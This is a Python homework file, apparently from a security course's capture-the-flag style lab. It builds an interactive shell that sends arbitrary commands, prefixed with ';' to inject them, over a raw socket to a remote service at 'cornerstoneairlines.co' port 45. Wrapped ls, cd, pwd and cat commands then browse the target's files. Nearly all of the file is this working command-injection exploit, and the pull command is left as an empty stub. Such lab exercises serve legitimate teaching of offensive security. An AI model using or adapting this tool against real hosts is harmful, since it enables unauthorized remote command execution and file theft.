"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
from subprocess import call
from cmd import Cmd

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here


def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    d = s.recv(4096).decode()
    if d == "\n":
        s.recv(1024)

    s.send((';' + cmd + '\n').encode())
    print(s.recv(1024).decode())


class Shell(Cmd):

    current_directory= "/"

    def do_quit(self, args):
        """
        This command quits the interactive shell
        """
        print("Goodbye!\n")
        raise SystemExit

    def do_shell(self, args):
        """
        This command opens up a shell
        """
        prompt.prompt = self.current_directory + '$'

    def do_pull(self, args):
        """
        This command executes a pull request from a remote path to a local path
        How to use
        Pull <remote_path> <local_path>
        """

    def do_pwd(self, args):
        """
        This command displays the current path to the working directory.
        """
        execute_cmd('cd ' + self.current_directory + ' && pwd')

    def do_ls(self, args):
        """
        This command displays the files within the current directory
        -a  | Displays all hidden files in directory
        -l  | Displays long format of files
        """

        execute_cmd('cd ' + self.current_directory + ' && ls ' + args)

    def do_cd(self, args):
        """
        This command changes the working directory to the provided directory
        :param args: The directory to become the new working directory.
        """
        self.current_directory = args
        if args == "" or args == '~':
            self.current_directory = '/'

        execute_cmd('cd ' + args)
        prompt.prompt = self.current_directory + '$'

    def do_cat(self, args):
        """
        This command prints a text file to the shell
        """
        execute_cmd('cd ' + self.current_directory + ' && cat ' + args)

    def do_clear(self, args):
        """
        This command clears the shell screen
        """
        call('clear')


if __name__ == '__main__':
    prompt = Shell()
    prompt.prompt = '$'
    prompt.cmdloop()

